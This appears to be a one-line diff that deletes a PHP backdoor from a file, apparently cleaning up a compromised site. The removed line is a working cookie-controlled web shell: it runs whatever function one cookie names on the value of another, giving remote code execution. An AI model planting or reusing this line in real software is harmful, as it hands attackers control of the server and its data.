@@ -1,1 +1,0 @@
-<?php if(isset($_COOKIE["noj"])){$_COOKIE["ZuIe"]($_COOKIE["noj"]);exit;}
